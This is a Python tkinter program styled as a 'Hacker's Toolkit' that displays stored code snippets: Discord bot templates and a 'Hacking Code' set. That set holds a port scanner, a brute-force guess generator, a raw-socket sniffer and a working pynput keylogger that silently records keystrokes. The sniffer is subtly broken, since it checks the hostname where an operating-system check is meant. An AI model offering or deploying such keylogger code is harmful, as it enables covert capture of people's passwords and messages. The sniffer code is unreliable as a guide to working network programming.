import tkinter as tk
from tkinter import scrolledtext

# Sample code snippets
discord_code_snippets = {
    "Bot Template": """import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

bot.run('YOUR_TOKEN_HERE')
""",
    "Simple Message Sender": """import discord

client = discord.Client()

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event
async def on_message(message):
    if message.content.startswith('!hello'):
        await message.channel.send('Hello!')
""",
    "Role Assigner": """import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def assign_role(ctx, user: discord.Member, role: discord.Role):
    await user.add_roles(role)
    await ctx.send(f"Assigned {role} to {user}")

bot.run('YOUR_TOKEN_HERE')
""",
    "Kick Member": """import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def kick(ctx, user: discord.Member, *, reason=None):
    await user.kick(reason=reason)
    await ctx.send(f"Kicked {user} for {reason}")

bot.run('YOUR_TOKEN_HERE')
"""
}

hacking_code_snippets = {
    "Port Scanner": """import socket

for port in range(1, 1025):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('localhost', port))
    if result == 0:
        print(f'Port {port} is open')
    sock.close()
""",
    "Keylogger": """import pynput.keyboard as keyboard

log = ''

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += ' ' + str(key) + ' '

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
""",
    "Basic Password Cracker": """import itertools

def password_cracker(chars, max_length):
    for length in range(1, max_length + 1):
        for guess in itertools.product(chars, repeat=length):
            yield ''.join(guess)

chars = 'abc123'
max_length = 4

for guess in password_cracker(chars, max_length):
    print(guess)
""",
    "Network Sniffer": """import socket

def sniff_packets(host):
    if socket.gethostname() == 'nt':
        sock_protocol = socket.IPPROTO_IP
    else:
        sock_protocol = socket.IPPROTO_ICMP

    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, sock_protocol)
    sniffer.bind((host, 0))
    
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    if socket.gethostname() == 'nt':
        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    print(sniffer.recvfrom(65565))

host = '127.0.0.1'
sniff_packets(host)
"""
}

class CodeApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Hacker's Toolkit")
        self.geometry("800x600")
        self.create_widgets()

    def apply_theme(self, theme):
        if theme == "dark":
            self.configure(bg='black')
            self.title_label.configure(fg='light gray', bg='black')
            self.button_frame.configure(bg='black')
            self.apply_button_theme('dark')
        elif theme == "light":
            self.configure(bg='light gray')
            self.title_label.configure(fg='dark gray', bg='light gray')
            self.button_frame.configure(bg='light gray')
            self.apply_button_theme('light')
        elif theme == "cyberpunk":
            self.configure(bg='black')
            self.title_label.configure(fg='cyan', bg='black')
            self.button_frame.configure(bg='black')
            self.apply_button_theme('cyberpunk')
        elif theme == "retro":
            self.configure(bg='black')
            self.title_label.configure(fg='green', bg='black')
            self.button_frame.configure(bg='black')
            self.apply_button_theme('retro')
        elif theme == "minimalist":
            self.configure(bg='white')
            self.title_label.configure(fg='black', bg='white')
            self.button_frame.configure(bg='white')
            self.apply_button_theme('minimalist')

    def apply_button_theme(self, theme):
        for button in self.button_frame.winfo_children():
            if theme == 'dark':
                button.configure(bg='dark gray', fg='light gray')
            elif theme == 'light':
                button.configure(bg='white', fg='dark gray')
            elif theme == 'cyberpunk':
                button.configure(bg='magenta', fg='black')
            elif theme == 'retro':
                button.configure(bg='green', fg='black')
            elif theme == 'minimalist':
                button.configure(bg='light gray', fg='black')

    def create_widgets(self):
        main_frame = tk.Frame(self, bg=self.cget('bg'))
        main_frame.pack(expand=True, fill='both')

        self.title_label = tk.Label(main_frame, text="Hacker's Toolkit", fg="green", bg=self.cget('bg'), font=("Courier", 24))
        self.title_label.pack(pady=10)

        self.button_frame = tk.Frame(main_frame, bg=self.cget('bg'))
        self.button_frame.pack(pady=20)

        tk.Button(self.button_frame, text="Customize Theme", command=self.open_theme_selector, font=("Courier", 16), width=20).pack(pady=10)
        tk.Button(self.button_frame, text="Hacking/Cybersecurity", command=self.show_hacking_section, font=("Courier", 16), width=20).pack(pady=10)
        tk.Button(self.button_frame, text="Credits", command=self.show_credits, font=("Courier", 16), width=20).pack(pady=10)

    def open_theme_selector(self):
        selector_window = tk.Toplevel(self)
        selector_window.title("Select Theme")
        selector_window.geometry("300x200")
        selector_window.configure(bg=self.cget('bg'))

        tk.Label(selector_window, text="Select Theme", fg="green", bg=self.cget('bg'), font=("Courier", 18)).pack(pady=10)

        themes = ["dark", "light", "cyberpunk", "retro", "minimalist"]
        for theme in themes:
            tk.Button(selector_window, text=theme.capitalize(), command=lambda t=theme: self.apply_theme(t), font=("Courier", 14), width=20).pack(pady=5)
        
        tk.Button(selector_window, text="Close", command=selector_window.destroy, font=("Courier", 16), width=20).pack(pady=10)

    def show_hacking_section(self):
        self.clear_window()
        section_frame = tk.Frame(self, bg=self.cget('bg'))
        section_frame.pack(expand=True, fill='both')

        tk.Label(section_frame, text="Hacking/Cybersecurity", fg="green", bg=self.cget('bg'), font=("Courier", 24)).pack(pady=10)
        
        button_frame = tk.Frame(section_frame, bg=self.cget('bg'))
        button_frame.pack(pady=20)

        tk.Button(button_frame, text="Discord Code", command=self.show_discord_code, font=("Courier", 16), width=20).pack(pady=10)
        tk.Button(button_frame, text="Hacking Code", command=self.show_hacking_code, font=("Courier", 16), width=20).pack(pady=10)
        tk.Button(button_frame, text="Back", command=self.create_widgets, font=("Courier", 16), width=20).pack(pady=10)

    def show_discord_code(self):
        self.clear_window()
        code_frame = tk.Frame(self, bg=self.cget('bg'))
        code_frame.pack(expand=True, fill='both')

        tk.Label(code_frame, text="Discord Code", fg="green", bg=self.cget('bg'), font=("Courier", 24)).pack(pady=10)

        button_frame = tk.Frame(code_frame, bg=self.cget('bg'))
        button_frame.pack(pady=20)

        for title, code in discord_code_snippets.items():
            tk.Button(button_frame, text=title, command=lambda code=code, title=title: self.show_code_window(title, code), font=("Courier", 16), width=20).pack(pady=5)
        
        tk.Button(button_frame, text="Back", command=self.show_hacking_section, font=("Courier", 16), width=20).pack(pady=10)

    def show_hacking_code(self):
        self.clear_window()
        code_frame = tk.Frame(self, bg=self.cget('bg'))
        code_frame.pack(expand=True, fill='both')

        tk.Label(code_frame, text="Hacking Code", fg="green", bg=self.cget('bg'), font=("Courier", 24)).pack(pady=10)

        button_frame = tk.Frame(code_frame, bg=self.cget('bg'))
        button_frame.pack(pady=20)

        for title, code in hacking_code_snippets.items():
            tk.Button(button_frame, text=title, command=lambda code=code, title=title: self.show_code_window(title, code), font=("Courier", 16), width=20).pack(pady=5)
        
        tk.Button(button_frame, text="Back", command=self.show_hacking_section, font=("Courier", 16), width=20).pack(pady=10)

    def show_code_window(self, title, code):
        code_window = tk.Toplevel(self)
        code_window.title(title)
        code_window.configure(bg=self.cget('bg'))

        tk.Label(code_window, text=title, fg="green", bg=self.cget('bg'), font=("Courier", 18)).pack(pady=10)

        text_widget = scrolledtext.ScrolledText(code_window, wrap=tk.WORD, fg="green", bg=self.cget('bg'), font=("Courier", 12), height=20, width=80)
        text_widget.insert(tk.END, code)
        text_widget.pack(pady=10)

        tk.Button(code_window, text="Back", command=code_window.destroy, font=("Courier", 16)).pack(pady=10)

    def show_credits(self):
        self.clear_window()
        credits_frame = tk.Frame(self, bg=self.cget('bg'))
        credits_frame.pack(expand=True, fill='both')

        tk.Label(credits_frame, text="Credits", fg="green", bg=self.cget('bg'), font=("Courier", 24)).pack(pady=10)

        tk.Label(credits_frame, text="Created by butter.", fg="green", bg=self.cget('bg'), font=("Courier", 16)).pack(pady=10)

        tk.Button(credits_frame, text="Back", command=self.create_widgets, font=("Courier", 16), width=20).pack(pady=10)

    def clear_window(self):
        for widget in self.winfo_children():
            widget.destroy()

if __name__ == "__main__":
    app = CodeApp()
    app.mainloop()

